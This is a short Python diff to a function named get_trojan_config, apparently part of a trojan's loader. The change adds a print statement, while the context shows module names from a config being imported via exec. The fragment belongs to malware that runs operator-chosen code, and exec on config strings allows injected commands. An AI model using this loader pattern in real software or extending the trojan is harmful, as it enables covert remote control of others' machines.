@@ -52,7 +52,7 @@ def get_trojan_config():
     for task in config:
         if task['module'] not in sys.modules:
             exec("import %s" % task["module"])
-
+            print "%s"%task['module']
     return config
 
 
